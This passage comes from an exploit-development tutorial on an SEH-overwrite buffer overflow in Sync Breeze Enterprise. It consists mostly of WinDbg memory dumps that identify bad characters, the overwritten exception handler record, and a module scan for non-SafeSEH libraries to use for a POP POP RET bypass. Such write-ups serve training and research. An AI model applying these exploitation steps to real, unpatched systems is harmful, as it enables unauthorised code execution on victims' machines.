</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">64</span>  f8 <span style="color:#ae81ff">5f</span> df <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>c0 ed bc <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">00</span>  ._..<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#f92672">&gt;</span>.......<span style="color:#f92672">&gt;</span>..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">74</span>  <span style="color:#ae81ff">29</span> d8 <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">76</span> f8 <span style="color:#ae81ff">5f</span> df <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span> d8 <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">76</span> dc ff <span style="color:#ae81ff">71</span> <span style="color:#ae81ff">01</span>  )..v._.....v..q.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">84</span>  <span style="color:#ae81ff">4</span>d <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">77</span> f8 <span style="color:#ae81ff">5f</span> df <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>dc df <span style="color:#ae81ff">5</span>e e0 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  M<span style="color:#f92672">%</span>.w._....<span style="color:#f92672">^</span>.....
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">94</span>  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> f8 <span style="color:#ae81ff">5f</span> df <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ....._..........
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span>a4  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span>b4  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
</span></span></code></pre></div><p>We can see that the payload is truncated after the &ldquo;01&rdquo; byte, which means that the &ldquo;02&rdquo; byte is a badchar.
Repeating this process leads us to the following badchars: 0x00, 0x02, 0x0A, 0x0D, 0xF8, 0xFD.
For example, here I attach how I detected that 0x0A is also a badchar:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">003</span>cb000
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">0174f</span>e0c
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">01750000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">0174f</span><span style="color:#ae81ff">000</span>
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">003</span>cb000
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00001260</span> . <span style="color:#ae81ff">00001</span><span style="color:#ae81ff">8</span>d0
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">0052</span>a988
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">003</span>c0000
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0174f</span>e0c
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x0174ff44</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x0096df5b</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dd <span style="color:#ae81ff">0x0174ff44</span> L8
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">42424242</span> <span style="color:#ae81ff">05040301</span> <span style="color:#ae81ff">09080706</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">54</span>  <span style="color:#ae81ff">00923e00</span> <span style="color:#ae81ff">00e25</span>e18 <span style="color:#ae81ff">00</span><span style="color:#ae81ff">924072</span> <span style="color:#ae81ff">00</span>bfedc0
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds <span style="color:#ae81ff">0x0174ff44</span> L8
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">48</span>  <span style="color:#ae81ff">42424242</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">4</span>c  <span style="color:#ae81ff">05040301</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">09080706</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">54</span>  <span style="color:#ae81ff">00923e00</span> libpal<span style="color:#f92672">!</span>SCA_WinFile<span style="color:#f92672">::</span>operator<span style="color:#f92672">=+</span><span style="color:#ae81ff">0xe40</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">58</span>  <span style="color:#ae81ff">00e25</span>e18
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>c  <span style="color:#ae81ff">00</span><span style="color:#ae81ff">924072</span> libpal<span style="color:#f92672">!</span>SCA_WinFile<span style="color:#f92672">::</span>operator<span style="color:#f92672">=+</span><span style="color:#ae81ff">0x10b2</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">60</span>  <span style="color:#ae81ff">00</span>bfedc0
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> db <span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">4</span>c  
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">4</span>c  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">06</span> <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">09</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">5</span>e e2 <span style="color:#ae81ff">00</span>  .........<span style="color:#f92672">&gt;</span>...<span style="color:#f92672">^</span>..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>c  <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">00</span> c0 ed bf <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">18</span> <span style="color:#ae81ff">5</span>e e2 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">00</span>  r<span style="color:#960050;background-color:#1e0010">@</span>.......<span style="color:#f92672">^</span>..<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#f92672">&gt;</span>..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">6</span>c  c0 ed bf <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">29</span> d8 <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">76</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">5</span>e e2 <span style="color:#ae81ff">00</span>  .....<span style="color:#f92672">&gt;</span>..)..v.<span style="color:#f92672">^</span>..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">7</span>c  <span style="color:#ae81ff">10</span> d8 <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">76</span> dc ff <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>d <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">5</span>e e2 <span style="color:#ae81ff">00</span>  ...v..t.M<span style="color:#f92672">%</span>.w.<span style="color:#f92672">^</span>..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">8</span>c  <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">19</span> dc <span style="color:#ae81ff">0</span>e <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">5</span>e e2 <span style="color:#ae81ff">00</span>  <span style="color:#960050;background-color:#1e0010">$</span>............<span style="color:#f92672">^</span>..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">9</span>c  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span>ac  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span>bc  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>c ff <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ..........t.....
</span></span></code></pre></div><p>After 09, the next byte should be 0A, but it&rsquo;s 00.</p>
<p>Now let&rsquo;s find a module of the application that have addresses without badchars and also that has SafeSEH off. The idea is to bypass SafeSEH by exploiting a module that does not implement SafeSEH, leveraging the POP R32, POP R32, RET instruction sequence from a module that was compiled without the /SAFESEH.</p>
<p><strong>Note: in order for this exploit to be portable against multiple Windows OS, we have to locate a POP, POP, RET instruction sequence inside a module that is part of the vulnerable software.</strong></p>
<p>Let&rsquo;s find the modules with the WinDbg <em>narly</em> extension. Let&rsquo;s load it and list the modules:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> .load narly
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      __s<span style="color:#f92672">|</span>I}<span style="color:#f92672">*!</span>{a.                        ._s,aan2<span style="color:#f92672">*</span>a
</span></span><span style="display:flex;"><span>     _wY1<span style="color:#f92672">+~-</span>    )S,                     .ae<span style="color:#e6db74">&#34;~=:...:X</span>
</span></span><span style="display:flex;"><span>   .vXl<span style="color:#f92672">+:</span>.       <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>c                   <span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+=|==::</span>..<span style="color:#f92672">:</span>d
</span></span><span style="display:flex;"><span>   vvi<span style="color:#f92672">=</span>;..        <span style="color:#f92672">-?</span>o,                <span style="color:#f92672">=</span><span style="color:#ae81ff">2</span><span style="color:#f92672">=+==:::</span>...<span style="color:#f92672">=</span>d
</span></span><span style="display:flex;"><span>  )nv<span style="color:#f92672">=:</span>.            )<span style="color:#ae81ff">5</span>,              <span style="color:#ae81ff">.2</span><span style="color:#f92672">=--</span>.......<span style="color:#f92672">-=</span>d
</span></span><span style="display:flex;"><span>  ue<span style="color:#f92672">+::</span>              <span style="color:#f92672">-*</span>s             <span style="color:#f92672">&lt;</span>c .        .<span style="color:#f92672">=</span>d
</span></span><span style="display:flex;"><span>  m<span style="color:#f92672">&gt;==::</span>..     ._,     <span style="color:#f92672">&lt;</span>s,           )c           :d
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#==viii|===; {Xs=,    -{s          )c         ..:d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  Z;{nnonnvvii;<span style="color:#a6e22e">v</span>(<span style="color:#f92672">-</span>{<span style="color:#f92672">%=</span>.    <span style="color:#f92672">~</span>s,        )e:<span style="color:#f92672">====||</span>iiv<span style="color:#f92672">%=</span>d
</span></span><span style="display:flex;"><span>  X<span style="color:#f92672">=</span>{oooonvvIl;<span style="color:#ae81ff">3</span>;  <span style="color:#f92672">-</span>{<span style="color:#f92672">%</span>,    <span style="color:#f92672">-*&gt;</span>       )<span style="color:#ae81ff">2</span><span style="color:#f92672">&lt;</span>onnnnvnnnn<span style="color:#f92672">&gt;</span>d
</span></span><span style="display:flex;"><span>  X<span style="color:#f92672">=</span>)vvvvIliii:<span style="color:#ae81ff">3</span>;    <span style="color:#f92672">-!</span>s.   <span style="color:#f92672">:</span>)s.     )e<span style="color:#f92672">&lt;</span>oonvlllllIid
</span></span><span style="display:flex;"><span>  X<span style="color:#f92672">=&lt;</span>lllliii<span style="color:#f92672">|=:</span>n;      <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>c.  <span style="color:#f92672">+|</span><span style="color:#ae81ff">1</span>,    )z<span style="color:#f92672">&lt;</span>nvii<span style="color:#f92672">||+|+|</span>vX
</span></span><span style="display:flex;"><span>  S<span style="color:#f92672">=&lt;</span>lli<span style="color:#f92672">|||=::</span> n;        <span style="color:#e6db74">&#34;nc  -s%;   )c=ovl|++==+=vo</span>
</span></span><span style="display:flex;"><span>  X<span style="color:#f92672">=&lt;</span>i<span style="color:#f92672">||+=</span>; . .n<span style="color:#960050;background-color:#1e0010">`</span>          <span style="color:#e6db74">&#34;1&gt;.-{%i. )c&lt;Xnnli||++=vn</span>
</span></span><span style="display:flex;"><span>  X<span style="color:#f92672">=</span>iii<span style="color:#f92672">&gt;==-</span>.  <span style="color:#f92672">:</span>o<span style="color:#960050;background-color:#1e0010">`</span>            <span style="color:#e6db74">&#34;1,:+iI,)c:Sonnvli||=v(</span>
</span></span><span style="display:flex;"><span>  X<span style="color:#f92672">&gt;</span>{ii<span style="color:#f92672">+</span>;<span style="color:#f92672">:-</span>  .<span style="color:#a6e22e">u</span>(               <span style="color:#e6db74">&#34;o,-{Iw(:nvvvllii=v2</span>
</span></span><span style="display:flex;"><span>  S<span style="color:#f92672">=</span>i<span style="color:#f92672">||</span>;<span style="color:#f92672">:</span>. .<span style="color:#f92672">=</span><span style="color:#a6e22e">u</span>(                 <span style="color:#f92672">-!</span>o,<span style="color:#f92672">+</span><span style="color:#a6e22e">I</span>(<span style="color:#f92672">:</span>iiillii<span style="color:#f92672">|</span>ie<span style="color:#960050;background-color:#1e0010">`</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;</span>v<span style="color:#f92672">|==</span>__su<span style="color:#f92672">?</span><span style="color:#960050;background-color:#1e0010">`</span>                    <span style="color:#f92672">-?</span>o,<span style="color:#f92672">-:==||</span>iisv<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  {nvnI<span style="color:#f92672">!</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">~</span>                         <span style="color:#f92672">-!</span>sasvv}<span style="color:#e6db74">&#34;&#34;</span><span style="color:#960050;background-color:#1e0010">`</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>             by Nephi <span style="color:#a6e22e">Johnson</span> (d0c_s4vage)
</span></span><span style="display:flex;"><span>                      N <span style="color:#66d9ef">for</span> gnarly<span style="color:#f92672">!</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Available commands:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">!</span>nmod     <span style="color:#f92672">-</span> display <span style="color:#f92672">/</span>SafeSEH, <span style="color:#f92672">/</span>GS, DEP, and ASLR info <span style="color:#66d9ef">for</span>
</span></span><span style="display:flex;"><span>                all loaded modules
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>nmod
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00400000</span> <span style="color:#ae81ff">00463000</span> syncbrs              <span style="color:#f92672">/</span>SafeSEH OFF                C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Sync Breeze Enterprise<span style="color:#960050;background-color:#1e0010">\</span>bin<span style="color:#960050;background-color:#1e0010">\</span>syncbrs.exe
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">850000</span> <span style="color:#ae81ff">00</span><span style="color:#ae81ff">905000</span> libsync              <span style="color:#f92672">/</span>SafeSEH OFF                C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Sync Breeze Enterprise<span style="color:#960050;background-color:#1e0010">\</span>bin<span style="color:#960050;background-color:#1e0010">\</span>libsync.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">910000</span> <span style="color:#ae81ff">009e4000</span> libpal               <span style="color:#f92672">/</span>SafeSEH OFF                C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Sync Breeze Enterprise<span style="color:#960050;background-color:#1e0010">\</span>bin<span style="color:#960050;background-color:#1e0010">\</span>libpal.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10000000</span> <span style="color:#ae81ff">10226000</span> libspp               <span style="color:#f92672">/</span>SafeSEH OFF                C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Sync Breeze Enterprise<span style="color:#960050;background-color:#1e0010">\</span>bin<span style="color:#960050;background-color:#1e0010">\</span>libspp.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">69240000</span> <span style="color:#ae81ff">69250000</span> wshbth               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>system32<span style="color:#960050;background-color:#1e0010">\</span>wshbth.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">69280000</span> <span style="color:#ae81ff">69296000</span> pnrpnsp              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>system32<span style="color:#960050;background-color:#1e0010">\</span>pnrpnsp.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">692e0000</span> <span style="color:#ae81ff">692f</span><span style="color:#ae81ff">1000</span> napinsp              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>system32<span style="color:#960050;background-color:#1e0010">\</span>napinsp.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">69880000</span> <span style="color:#ae81ff">6988e000</span> winrnr               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>winrnr.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>a530000 <span style="color:#ae81ff">6</span>a5cf000 ODBC32               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>ODBC32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>ab10000 <span style="color:#ae81ff">6</span>ab38000 WINMM                <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>WINMM.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>ac30000 <span style="color:#ae81ff">6</span>ac44000 NETAPI32             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>NETAPI32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>acd0000 <span style="color:#ae81ff">6</span>ace9000 MPR                  <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>MPR.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>dbe0000 <span style="color:#ae81ff">6</span>dbfd000 SRVCLI               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>SRVCLI.DLL
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">72780000</span> <span style="color:#ae81ff">72796000</span> NLAapi               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>system32<span style="color:#960050;background-color:#1e0010">\</span>NLAapi.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">73610000</span> <span style="color:#ae81ff">73</span>c28000 windows_storage      <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>windows.storage.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74300000</span> <span style="color:#ae81ff">74311000</span> WKSCLI               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>WKSCLI.DLL
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74520000</span> <span style="color:#ae81ff">74552000</span> IPHLPAPI             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>IPHLPAPI.DLL
